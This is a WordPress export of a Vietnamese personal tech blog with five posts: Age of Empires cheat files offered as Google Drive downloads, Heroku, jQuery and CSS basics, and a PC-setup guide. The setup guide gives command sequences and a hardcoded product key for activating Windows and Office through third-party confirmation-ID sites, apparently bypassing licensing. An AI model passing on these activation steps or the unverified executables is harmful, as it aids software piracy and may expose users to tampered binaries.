<?xml version="1.0" encoding="UTF-8" ?>
<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your site. -->
<!-- It contains information about your site's posts, pages, comments, categories, and other content. -->
<!-- You may use this file to transfer that content from one site to another. -->
<!-- This file is not intended to serve as a complete backup of your site. -->

<!-- To import this information into a WordPress site follow these steps: -->
<!-- 1. Log in to that site as an administrator. -->
<!-- 2. Go to Tools: Import in the WordPress admin panel. -->
<!-- 3. Install the "WordPress" importer from the list. -->
<!-- 4. Activate & Run Importer. -->
<!-- 5. Upload this file using the form provided on that page. -->
<!-- 6. You will first be asked to map the authors in this export file to users -->
<!--    on the site. For each author, you may choose to map to an -->
<!--    existing user on the site or to create a new user. -->
<!-- 7. WordPress will then import each of the posts, pages, comments, categories, etc. -->
<!--    contained in this file into your site. -->

	<!-- generator="WordPress/6.0.1" created="2022-08-07 00:58" -->
<rss version="2.0"
	xmlns:excerpt="http://wordpress.org/export/1.2/excerpt/"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:wp="http://wordpress.org/export/1.2/"
>

<channel>
	<title>Pulse Of The Blogosphere</title>
	<link>https://duycode.com</link>
	<description>Just another WordPress site</description>
	<pubDate>Sun, 07 Aug 2022 00:58:18 +0000</pubDate>
	<language>en-US</language>
	<wp:wxr_version>1.2</wp:wxr_version>
	<wp:base_site_url>https://duycode.com</wp:base_site_url>
	<wp:base_blog_url>https://duycode.com</wp:base_blog_url>

		<wp:author><wp:author_id>1</wp:author_id><wp:author_login><![CDATA[admin]]></wp:author_login><wp:author_email><![CDATA[admin@duycode.com]]></wp:author_email><wp:author_display_name><![CDATA[admin]]></wp:author_display_name><wp:author_first_name><![CDATA[]]></wp:author_first_name><wp:author_last_name><![CDATA[]]></wp:author_last_name></wp:author>

				
	<generator>https://wordpress.org/?v=6.0.1</generator>

		<item>
		<title><![CDATA[Age of Empires: The Rise of Rome]]></title>
		<link>https://duycode.com/2019/08/13/chao-moi-nguoi/</link>
		<pubDate>Tue, 13 Aug 2019 12:12:08 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>I. Bản chuẩn</h2>
<img src="http://i2.taimienphi.vn/tmp/cf/Images/txh/2018/2/27/aoe-1-1.jpg" alt="" />
- Bản Full dùng được lệnh:
- Bản chuẩn dùng trong thi đấu: Download tại GameTV
- Lưu bản Campain: game0.nfo (trong thư mục chính)
<h2>II. Hack AOE</h2>
<h3>1. Hack bản đồ sáng</h3>
- Download và ghi đè ở thư mục gốc AOE: <a href="https://drive.google.com/open?id=1TKX6pgrWpU8eB9VagtqhqXVZWAAGXGKo" rel="noopener noreferrer" target="_blank">EMPIRESX.EXE</a>
- Các tính năng chính: Nhìn thấy mọi đơn vị trên bản đồ (bản đồ sáng)
<h3>2. Hack tài nguyên </h3>
- Download và đặt vào thư mục gốc AOE: <a href="https://drive.google.com/open?id=13y6xLAl6c5E4Q4G290ynFaxoAeS33c7o" target="_blank" rel="noopener noreferrer">dsound.dll</a>
- Các tính năng chính: Xin tài nguyên, del dân đối phương, del voi huơu
- Cách sử dụng:  Trong game nhấn " ~ " hoặc " F12 " để nhập mã
<h4>1.1. Các nút tắt</h4>
- " ~ " hoặc " F12 ": Nhập mã
- F1: Win luôn
- F2 myreshack2(): +500 vào tất cả tài nguyên
- F4: Xem tên của máy, Xem thông tin của người chơi [Thịt(F), Gỗ(W), Vàng(G), Đá(S)]
- F6: Maphack: nhìn được tất cả mọi đối tượng trên bản đồ
- F7 = myreshack(): + 10.000 vào tất cả tài nguyên
- F8 = mypophack(): Tổng số lượng dân được tăng lên (không cần xây BE nữa)
- F9= myallally
<h4>1.2. Gõ lệnh</h4>
- list: Hiện số thứ tự người chơi (number)
- resign(1): Chọn máy nào thua, trong trường hợp này là máy số 1
- setwinner(number): Chọn đối tượng chiến thắng
- setmaphack(number): Chọn đối tượng sử dụng maphack
- food(number,amount): +Thức Ăn vào (Máy số, Số lương thực), Ví dụ: food(1,1000)
- wood(number,amount): +Thức Gỗ vào (Máy số, Số Gỗ), Ví dụ: wood(1,1000)
- gold(number,amount): +Thức Vàng vào (Máy số, Số Vàng), Ví dụ: gold(1,1000)
- stone(number,amount): +Thức Đá vào (Máy số, Số Đá), Ví dụ: store(1,1000)
- cls: Xóa tất cả những lệnh đã đánh
<h3>3. Hack sử dụng các đơn vị quân </h3>
- Download và đặt vào thư mục DATA2: <a href="https://drive.google.com/open?id=1SvFHFCReVSdM6Ew8MAGUSHyfiRyKJFIR" target="_blank" rel="noopener noreferrer">empires.dat</a>
- Các tính năng chính: xin mọi đơn vị quân, xin dân nhanh, xin phù thủy sét]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>7</wp:post_id>
		<wp:post_date><![CDATA[2019-08-13 12:12:08]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-08-13 12:12:08]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-08-13 12:12:08]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-08-13 12:12:08]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[chao-moi-nguoi]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="windows"><![CDATA[Windows]]></category>
						</item>
					<item>
		<title><![CDATA[Heroku  cơ bản]]></title>
		<link>https://duycode.com/2019/08/19/heroku-toan-tap/</link>
		<pubDate>Mon, 19 Aug 2019 14:51:48 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=18</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://miro.medium.com/max/1838/1*fIjRtO5P8zc3pjs0E5hYkw.png" alt="" />
1. Download và cài đặt Heroku (NodeJS):
https://devcenter.heroku.com/articles/getting-started-with-nodejs#set-up
- Cần đăng ký tài khoản
- Cần cài Nodejs trước

2. Làm việc
- Tạo folder trống, mở bằng Webstorm
heroku -v  --> kiểm tra cài đặt chưa
heroku login  --> login bằng chrome
git clone https://github.com/heroku/node-js-getting-started.git  -->git thư mục nodejs về
cd node-js-getting-started --> vào folder nodejs
heroku create --> tạo app trên heroku
git push heroku master --> đẩy lên trang heroku
heroku ps:scale web=1 --> tự động thay đổi kiểu nodemon
heroku open --> mở link website mình lên

3. Bắt đầu làm Nodejs
npm install
npm i body-parser ejs express mongoose multer nodemon --> cài module

- Tạo folder: Models, Public, Views
- Làm việc với file: index.js
- heroku chỉ nhận cổng PORT: 5000
<pre>
app.listen(process.env.PORT || 5000,function () {
    console.log("server is running");
})
</pre>

4. Đẩy code mới
git add .
git commit -am "make it better"
git push heroku master

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>18</wp:post_id>
		<wp:post_date><![CDATA[2019-08-19 14:51:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-08-19 14:51:48]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-08-19 14:51:48]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-08-19 14:51:48]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[heroku-toan-tap]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="applications"><![CDATA[Applications]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_2e4067c3cb72738ee3f4b98589f4c414]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[jQuery cơ bản]]></title>
		<link>https://duycode.com/2019/08/20/jquery-co-ban/</link>
		<pubDate>Tue, 20 Aug 2019 21:41:45 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=33</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://www.webdesignerdepot.com/cdn-origin/uploads/2019/07/featured_jquery.jpg" alt="" />
<h3>1. jQuery.each()</h3>
<pre>
// DOM elements
// Outputs: div0:header, div1:body, div2:footer
$('div').each(function (index, value) {
	console.log('div' + index + ':' + $(this).attr('id'));
});

// Arrays
// Outputs: 0:one, 1:two, 2:three, 3:four.
var numbers = [one, two, three, four];
$.each(numbers , function (index, value){
	console.log(index + ':' + value);
});

// Objects
// Outputs: 1 2 3 4 5
var obj = {one: 1,two: 2,three: 3,four: 4,five: 5};
$.each(obj, function (index, value) {
	console.log(value);
});
</pre>

<h2>1. jQuery Selectors</h2>
<h3>1.1. All about call Index</h3>
<h4>Các cách gọi thường gặp là:</h4>
<blockquote>$(selector).index(element)</blockquote>
- selector: ".class","#id", "element" or "this"
- element (optional): "#id" (nếu dùng class sẽ nhận vị trí class đầu tiên)
<pre>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Test jQuery</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script>
        $(document).ready(function () {
            $("li").click(function () {
                let a = $(this).index();
                let b = $("li").index($("#region"));
                $(".action1").text(a);
                $(".action2").text(b);
                console.log(b);
            })
        })
    </script>
</head>
<body>
<p>List day in a week</p>
<ul>
    <li>Monday</li>
    <li>Tuesday</li>
    <li>Wednesday</li>
    <li id="region">Thurday</li>
    <li>Friday</li>
    <li>Saturday</li>
    <li>Sunday</li>
</ul>
<p>Bạn vừa click vào "li" vị trí (index): <span class="action1"></span></p>
<p>Vị trí của "li"  mà có gắn "#region" là: <span class="action2"></span></p>
</body>
</html>
</pre>

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>33</wp:post_id>
		<wp:post_date><![CDATA[2019-08-20 21:41:45]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-08-20 21:41:45]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-08-20 21:41:45]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-08-20 21:41:45]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[jquery-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="front-end"><![CDATA[Front End]]></category>
						</item>
					<item>
		<title><![CDATA[CSS cơ bản]]></title>
		<link>https://duycode.com/2019/08/20/css-co-ban/</link>
		<pubDate>Tue, 20 Aug 2019 14:42:12 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=35</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://drive.google.com/uc?export=view&id=1iL5magKZpu3D_oPcB_Iespyb8uMZHwW0" alt="Css funny" />
<h2>1. Thứ tự viết code CSS hợp lý </h2>
<pre>
{
    display: ;    /* Where and how the box is placed */
    position: ;
    float: ;
    clear: ;

    visibility: ; /* Can the box be seen? */
    opacity: ;
    z-index: ;

    margin: ;     /* Layers of the box model */
    outline: ;
    border: ;
    background: ;
    padding: ;

    width: ;      /* Content dimensions and scrollbars */
    height: ;
    overflow: ;

    color: ;      /* Text */
    text: ;
    font: ;
}
</pre>
<h2>2. Variable CSS</h2>
<pre>
<style>
	:root {
		--main-color: #ffa400;
		--base-size: 60px

	}
	.square {
		background: var(--main-color);
		width: var(--base-size);
		height: var(--base-size);
	}
	.rectangle {
		background: var(--color);
		width: calc(var(--i) * var(--base-size));
		height: calc(var(--j) * var(--base-size));
	}
</style>

<div class="square"></div><br/>
<div class="rectangle" style="--i:5;--j:2;--color:green"></div><br/>
</pre>

<h2>3. CSS Selector </h2>
<table>
<tbody>
<tr>
<td>#</td>
<td>Type</td>
<td>Example</td>
</tr>
<tr>
<td>1</td>
<td>Basic CSS Selectors</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>2</td>
<td>Descendant CSS Selectors</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>3</td>
<td>Multiple CSS Selector</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>4</td>
<td>Combination CSS Selectors</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>5</td>
<td>Sibling CSS Selectors</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>6</td>
<td>Pseudo CSS Selectors</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>7</td>
<td>Pseudo CSS Selectors (link v&agrave; input)</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>8</td>
<td>Attribute CSS Selectors</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>

<table>
<tbody>
<tr>
<td>Loại</td>
<td>V&iacute; dụ</td>
<td>Giải th&iacute;ch</td>
</tr>
<tr>
<td>descendant&nbsp;selector</td>
<td>div p</td>
<td>Tất cả element p l&agrave; hậu duệ b&ecirc;n trong&nbsp;div</td>
</tr>
<tr>
<td>Child combinator</td>
<td>div &gt;&nbsp;p</td>
<td>Tất cả element p l&agrave; con trực tiếp (hậu duệ đời 1) của div</td>
</tr>
<tr>
<td>younger siblings</td>
<td>div ~&nbsp;ul</td>
<td>Tất cả element ul l&agrave; anh chị em c&ugrave;ng cấp trẻ hơn của&nbsp;div</td>
</tr>
<tr>
<td>younger adjacent sibling</td>
<td>div +&nbsp;ul</td>
<td>Tương tự div&nbsp;~&nbsp;ul, nhưng chỉ lấy ul liền kề ngay sau của div&nbsp;</td>
</tr>
</tbody>
</table>

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>35</wp:post_id>
		<wp:post_date><![CDATA[2019-08-20 21:42:12]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-08-20 14:42:12]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-08-20 21:42:12]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-08-20 14:42:12]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[css-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="css"><![CDATA[CSS]]></category>
						</item>
					<item>
		<title><![CDATA[Cài một máy tính hoàn chỉnh - P1: Cài Windows,Ghost và Office]]></title>
		<link>https://duycode.com/2019/08/20/cai-mot-may-tinh-hoan-chinh-p1-cai-windowsghost-va-office/</link>
		<pubDate>Tue, 20 Aug 2019 21:44:22 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=38</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>I. Download Windows và Office</h2>
<h3>1. Windows và Office bản gốc Microsoft</h3>
<h4>1.1. Link tổng hợp: </h4>
-- Link 1: <a href="https://docs.google.com/spreadsheets/d/1o5dmOw8jBCVGxFmlMOsKgoIKULMY7tk-TCSz67IJMc4/pubhtml" target="_blank" rel="noopener noreferrer">https://docs.google.com/spreadsheets/d/1o5dmOw8jBCVGxFmlMOsKgoIKULMY7tk-TCSz67IJMc4/pubhtml</a>
-- Link 2 - GoogleDriver: <a href="https://docs.google.com/spreadsheets/d/14-D4tIlFp9APP0OOvQBRXvfLOYC447UygywenX5LXfo/edit#gid=960687212" rel="noopener" target="_blank">https://docs.google.com/spreadsheets/d/14-D4tIlFp9APP0OOvQBRXvfLOYC447UygywenX5LXfo/edit#gid=960687212</a>

<h4>1.2. Window</h4>
- Win 7 Sp1x64 Professional: SHA1: 0BCFC54019EA175B1EE51F6D2B207A3D14DD2B58 
- Win 7 Sp1x32 Professional: SHA1: D89937DF3A9BC2EC1A1486195FD308CD3DADE928

<h4>1.3. Office</h4>
- Office_ProPlus_2013_SP1x32 (Bản VLSC): d4d7ffd3dffef0a3c08748e400e0890a7a730888  -Link GoogleDriver: <a href="https://drive.google.com/file/d/1SpuzzZSFvtbVWOX6qqofHWoOi4ngDC8_/view" rel="noopener" target="_blank">https://drive.google.com/file/d/1SpuzzZSFvtbVWOX6qqofHWoOi4ngDC8_/view</a>
- Office_ProPlus_2013_SP1x64 (Bản VLSC): ab2c2d525d63a72e0a2dc66efdcea0f824f02cff  -Link GoogleDriver: <a href="https://drive.google.com/file/d/1KSsy1l2hkDIzEvOYWZapjZILQ_XY0Dbe/view" rel="noopener" target="_blank">https://drive.google.com/file/d/1KSsy1l2hkDIzEvOYWZapjZILQ_XY0Dbe/view</a>
- Office 2019 Pro Plus 64bit Retail: <a href="https://officecdn.microsoft.com/pr/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/Office/Data/SetupProPlus2019Retail.x64.en-us.exe" rel="noopener" target="_blank">https://officecdn.microsoft.com/pr/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/Office/Data/SetupProPlus2019Retail.x64.en-us.exe</a>

<h3>2. Công cụ</h3>
<h4>2.1. Check key Online</h4>
<a href="https://quanghuy.it/check-key" target="_blank" rel="noopener noreferrer">https://quanghuy.it/check-key</a>
<a href="http://khoatoantin.com/pidms" target="_blank" rel="noopener noreferrer">http://khoatoantin.com/pidms</a>
<a href="https://dbmer.com/checkkey/">https://dbmer.com/checkkey/</a>

<h4>2.2. Get Confirmation ID:</h4>
<a href="http://khoatoantin.com/cidms" target="_blank" rel="noopener noreferrer">http://khoatoantin.com/cidms</a>
- User: HQCNTH - Pass: MIGOI
- User: trogiup24h- Pass: PHO
<a href="https://getcid.top/" target="_blank" rel="noopener noreferrer">https://getcid.top/</a>
<a href="https://0xc004c008.com/">https://0xc004c008.com/</a>
<a href="https://getcid.info/">https://getcid.info/</a>

<h2>II. Cài Win và Ghost</h2>
<h3>1. Tạo USB cài Win</h3>
- Dùng phần mềm Rufus: <a href="https://rufus.akeo.ie/?locale=vi_VN" target="_blank" rel="noopener noreferrer">https://rufus.akeo.ie/?locale=vi_VN</a>

<h3>2. Bolus cần biết</h3>
 - Hiểu thế nào về "BIOS" và "UEFI", "MBR" và "GPT", "Legacy"</h3>
<img src="https://www.passmoz.com/images/others/firmware-workflow.jpg" alt="BIOS vs UEFI" />
- Có thể hiểu đơn giản: "UEFI" là chẩn mới đang dần thay thế cho chuẩn cũ "BIOS", từ "Legacy" - nghĩa là BIOS
- UEFI chỉ hỗ trợ cho các phiên bản Windows 64-bit
- Nếu sử dụng chuẩn "UEFI" &gt; cần định dạng ổ cứng là "GPT"
- Nếu sử dụng chuẩn "Legacy" &gt; cần định dạng ổ cứng là "MBR"

<h4>a. Kiểm tra BIOS Mode</h4>
- Vào: Run\ msinfo32
- Kéo xuống phần BIOS Mode: "UEFI" hoặc "Legacy"
- Nếu máy tính có hỗ trợ chuẩn "UEFI", có thể vào BIOS để chuyển qua lại giữa 2 chuẩn này

<h4>b. Kiểm tra định dạng ổ cứng</h4>
- Vào: Run\ diskpart -&gt; đánh lệnh: list disk
- Tại đây máy tính sẽ được hiện thị tất cả các ổ cứng
- Tại cột “Gpt”: nếu có dấu * --&gt; chuẩn "GPT", còn nếu không có --&gt; chuẩn "MBR"


<h2>III. Active Windows và Office</h2>
-- Tham khảo thêm: <a href="https://vn-z.vn/threads/tong-hop-key-windows-va-office.10945/" rel="noopener" target="_blank">https://vn-z.vn/threads/tong-hop-key-windows-va-office.10945/</a>

<h3>1. Windows 10</h3>
Đầu tiên bạn phải chạy Cmd (Quyền Admin)
<strong><span style="color: #993300;">Bước 1:</span></strong> Kiểm tra xem Windows đã Active hay chưa theo các lệnh sau:
<blockquote>
slmgr.vbs /dli  ##Hiển thị thông tin giấy phép cơ bản
slmgr.vbs /dlv  ##Hiển thị thông tin giấy phép đầy đủ
slmgr.vbs /xpr  ##Hiển thị ngày hết hạn của giấy phép
</blockquote>

<strong><span style="color: #993300;">Bước 2:</span></strong> Đưa Windows về trạng thái chưa nhập Key nào bằng các lệnh:
<blockquote>
slmgr.vbs /upk ##Gỡ bỏ key
slmgr.vbs /cpky ##Gỡ key khỏi Registry
slmgr.vbs /rearm ##Reset kích hoạt
</blockquote>
Sau khi thực hiện 3 lệnh trên bạn phải khởi động lại máy tính

<strong><span style="color: #993300;">Bước 3:</span></strong> Điền Key bằng lệnh:
<blockquote>
slmgr.vbs -ipk XXXXX-XXXXX-XXXXX-XXXXX-XXXXX
</blockquote>

<strong><span style="color: #993300;">Bước 4:</span></strong> Lấy ID2 Windows nhanh theo lệnh sau
<blockquote>
slmgr.vbs /dti>step2.txt
start step2.txt
</blockquote>

<strong><span style="color: #993300;">Bước 5:</span></strong> Lấy ID3 theo hướng dẫn ở đây:
<a href="http://khoatoantin.com/cidms" target="_blank" rel="noopener noreferrer">http://khoatoantin.com/cidms</a>
- User: HQCNTH - Pass: MIGOI
- User: trogiup24h- Pass: PHO
<a href="https://getcid.top/" target="_blank" rel="noopener noreferrer">https://getcid.top/</a>

<strong><span style="color: #993300;">Bước 6:</span></strong> Điền ID3 (không dấu gạch ngang) theo lệnh:
<blockquote>
slmgr.vbs /atp ID3
</blockquote>

<strong><span style="color: #993300;">Bước 7:</span></strong> Kích hoạt Windows theo lệnh sau
slmgr.vbs -ato

<strong><span style="color: #993300;">Bolus: </span></strong> Một số lệnh CMD khác của Windows
<blockquote>
slmgr.vbs /rilc - Reset lại license được lưu trong hệ thống
slmgr.vbs /skms <Máy chủ hỗ trợ và còn sống> (Đặt máy chủ KMS)
slmgr.vbs /ckms - Xoá máy chủ KMS
</blockquote>


<h3>2. Office</h3>
<strong><span style="color: #993300;">Bước 1:</span></strong> Trỏ vào folder của Office (tương ứng như sau: 14 - Office 2010, 15 - Office 2013, 16 - Office 2016,2019):
<blockquote>
set ver=16
if exist "%ProgramFiles%\Microsoft Office\Office%ver%\ospp.vbs" cd /d "%ProgramFiles%\Microsoft Office\Office%ver%"
if exist "%ProgramFiles(x86)%\Microsoft Office\Office%ver%\ospp.vbs" cd /d "%ProgramFiles(x86)%\Microsoft Office\Office%ver%"
</blockquote>

<strong><span style="color: #993300;">Bước 2:</span></strong> Add Key mới</h4>
<blockquote>cscript ospp.vbs /inpkey:<Key của bạn></blockquote>

<strong><span style="color: #993300;">Bước 3:</span></strong> Convert từ bản Retail sang Volume
<blockquote>for /f %i in ('dir /b ..\root\Licenses16\ProPlus2019VL_MAK*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%i"
</blockquote>

<strong><span style="color: #993300;">Bước 4:</span></strong> Lấy step 2:
<blockquote>cscript OSPP.VBS /dinstid&gt;step2.txt
start step2.txt</blockquote>

<strong><span style="color: #993300;">Bước 5:</span></strong> Điền step 3:
<blockquote>cscript OSPP.VBS /actcid:&lt;8_nhóm_CID_viết_liền&gt;</blockquote>

<strong><span style="color: #993300;">Bước 6:</span></strong> Kiểm tra tình trạng bản quyền (key cũ đã điền - chỉ hiện 5 ký tự cuối của tất cả các key đã up)</h4>
<blockquote>
cscript ospp.vbs /dstatus (Hiện thông tin kích hoạt với key hiện tại)
cscript ospp.vbs /dstatusall (Hiện thông tin kích hoạt đầy đủ)
</blockquote>

<strong><span style="color: #993300;">Bolus:</span></strong> Kích hoạt nhanh Office 2019 Pro Plus 64bit Retail:
<blockquote>
cscript slmgr.vbs /upk 52c4d79f-6e1a-45b7-b479-36b666e0a2f8
cscript slmgr.vbs /upk 5f472f1e-eb0a-4170-98e2-fb9e7f6ff535
cscript slmgr.vbs /upk a3072b8f-adcc-4e75-8d 62-fdeb9 bdfae57
if exist "%ProgramFiles%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles%\Microsoft Office\Office16"
if exist "%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles(x86)%\Microsoft Office\Office16"
cscript ospp.vbs /remhst
cscript ospp.vbs /ckms-domain
for /f %i in ('dir /b ..\root\Licenses16\ProPlus2019VL_MAK*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%i"
cscript //nologo ospp.vbs /inpkey:GP3YN-RPX2T-FVYT8-4TPFY-7MKG3
cscript //nologo ospp.vbs /act
cscript //nologo ospp.vbs /dinstid > step2.txt
start step2.txt
cls
cscript ospp.vbs /actcid:
</blockquote>
- Lấy step3 như ở trên rồi điền nốt vào -> Finish

<h3>2. Sao lưu bản quyền office 2019</h3>
- Bước 1: Dùng CMD
<blockquote>
cd C:\Windows\System32
net stop sppsvc
</blockquote>
- Backup: Trong thư mục: C:\Windows\System32\spp\store ==> Lưu lại thư mục 2.0
- Restore: copy đè ngược lại là xong

<h2>IV. Driver</h2>
<h3>1. Driver HP EliteBook 8570p - Windows 7 x64bit</h3>
Link Full: <a href="https://support.hp.com/us-en/drivers/selfservice/hp-elitebook-8570p-notebook-pc/5212912" target="_blank" rel="noopener noreferrer">https://support.hp.com/us-en/drivers/selfservice/hp-elitebook-8570p-notebook-pc/5212912</a>
- LAN: <a href="https://ftp.hp.com/pub/softpaq/sp60501-61000/sp60775.exe" target="_blank" rel="noopener noreferrer">https://ftp.hp.com/pub/softpaq/sp60501-61000/sp60775.exe</a>
- Wifi: <a href="https://ftp.hp.com/pub/softpaq/sp58501-59000/sp58782.exe" target="_blank" rel="noopener noreferrer">https://ftp.hp.com/pub/softpaq/sp58501-59000/sp58782.exe</a>
- Graphics: <a href="https://ftp.hp.com/pub/softpaq/sp57001-57500/sp57174.exe" target="_blank" rel="noopener noreferrer">https://ftp.hp.com/pub/softpaq/sp57001-57500/sp57174.exe</a>
- Audio: <a href="https://ftp.hp.com/pub/softpaq/sp60001-60500/sp60317.exe" target="_blank" rel="noopener noreferrer">https://ftp.hp.com/pub/softpaq/sp60001-60500/sp60317.exe</a>
- Toupad: <a href="https://ftp.hp.com/pub/softpaq/sp63501-64000/sp63779.exe" target="_blank" rel="noopener noreferrer">https://ftp.hp.com/pub/softpaq/sp63501-64000/sp63779.exe</a>
- Bluetooth (64bit): <a href="https://ftp.hp.com/pub/softpaq/sp66001-66500/sp66402.exe" target="_blank" rel="noopener noreferrer">https://ftp.hp.com/pub/softpaq/sp66001-66500/sp66402.exe</a>
- Canon Printer: <a href="https://vn.canon/vi/support/0100278201/9" target="_blank" rel="noopener noreferrer">https://vn.canon/vi/support/0100278201/9</a>

<h3>2. Driver HP Probook 6460b - Windows 7</h3>
Link Full: <a href="https://support.hp.com/us-en/drivers/selfservice/hp-probook-6460b-notebook-pc/5045594" rel="noopener" target="_blank">https://support.hp.com/us-en/drivers/selfservice/hp-probook-6460b-notebook-pc/5045594</a>
- LAN - x32x64: <a href="https://ftp.hp.com/pub/softpaq/sp60501-61000/sp60775.exe" target="_blank" rel="noopener noreferrer">https://ftp.hp.com/pub/softpaq/sp60501-61000/sp60775.exe</a>
- Wifi - x32x64: <a href="https://ftp.hp.com/pub/softpaq/sp58501-59000/sp58782.exe" target="_blank" rel="noopener noreferrer">https://ftp.hp.com/pub/softpaq/sp58501-59000/sp58782.exe</a>
- Graphics x32: <a href="https://ftp.hp.com/pub/softpaq/sp64501-65000/sp64729.exe" rel="noopener" target="_blank">https://ftp.hp.com/pub/softpaq/sp64501-65000/sp64729.exe</a>
- Graphics x64: <a href="https://ftp.hp.com/pub/softpaq/sp64501-65000/sp64730.exe" rel="noopener" target="_blank">https://ftp.hp.com/pub/softpaq/sp64501-65000/sp64730.exe</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>38</wp:post_id>
		<wp:post_date><![CDATA[2019-08-20 21:44:22]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-08-20 21:44:22]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-04-16 19:04:53]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-04-16 19:04:53]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cai-mot-may-tinh-hoan-chinh-p1-cai-windowsghost-va-office]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="windows"><![CDATA[Windows]]></category>
						</item>
					<item>
